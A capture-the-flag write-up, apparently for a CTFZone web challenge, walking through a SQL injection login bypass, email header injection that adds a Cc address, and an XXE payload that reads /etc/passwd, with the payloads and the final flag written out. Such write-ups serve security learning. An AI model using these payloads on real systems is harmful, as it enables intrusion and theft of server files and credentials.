So first it was really amazing task that make me work hard and try again and again to get something<br />
Our team was working on this task and its a good way to get the job done when you have good web guys<br />
We didnt get the last part which is just 5% of the task but we did well even we dont get the flag before the ctf end<br />
<br />
Its good too to share what we get and why not to share last part we miss <br />

First it was a web login page <br />

![login](https://user-images.githubusercontent.com/7364615/28275160-5715e578-6b13-11e7-8be3-746bb7dcc705.PNG)

OK here where the challenge start<br />

As always check sql injection is the good way to fast work :D <br />
and as usual it works :D <br />

simple login bypass  ' or 1=1 -- in username do the job <br />

then just start dump database and get some data which was not so interesting for us , no flag in data base 

current DB : task200 <br />
Table : users <br />
user : admin <br />
password : verystrongpassword <br />

and also table posts with static data

anyway lets go far 

when we login we get this page 

![image](https://user-images.githubusercontent.com/7364615/28275423-1083f16c-6b14-11e7-9240-56dd1a0a9b34.png)

here me and my team start think about phpmailer bug , but not work after some test 

then after some check we get that its email header injection that make us able to redirect the email to our account :D 
look amazing now here :D 

this is our payload used : 
POST : subject=Report+from+16-07-2017+12-18%0d%0aCc:email@gmail.com%0d%0a&encoding=UTF-8

![image](https://user-images.githubusercontent.com/7364615/28275535-6a91760c-6b14-11e7-80e9-396f88656232.png)

it was xml file 

![image](https://user-images.githubusercontent.com/7364615/28275635-c5548e44-6b14-11e7-82cd-7fd7aa3e97ca.png)

here look XML External Entity (XXE) 

so all we need to do is to make xxe in subject to get email with some data from the server

it was really bad for us , we make all test but we miss the last part to make this work 

the last payload to get flag is to read /etc/passwd file from the server 

payload : subject=-->%26xxe;test123%0d%0aCc:+email@gmail.com&encoding=UTF-8"%3f><!DOCTYPE+foo+[<!ELEMENT+foo+ANY+><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd"+>]><report><about><subject><!--

![image](https://user-images.githubusercontent.com/7364615/28275820-5f3df590-6b15-11e7-9a62-8b544b79b853.png)

and the flag was : ctfzone{c5b8865cc6d98898f391c911f4c371a3}
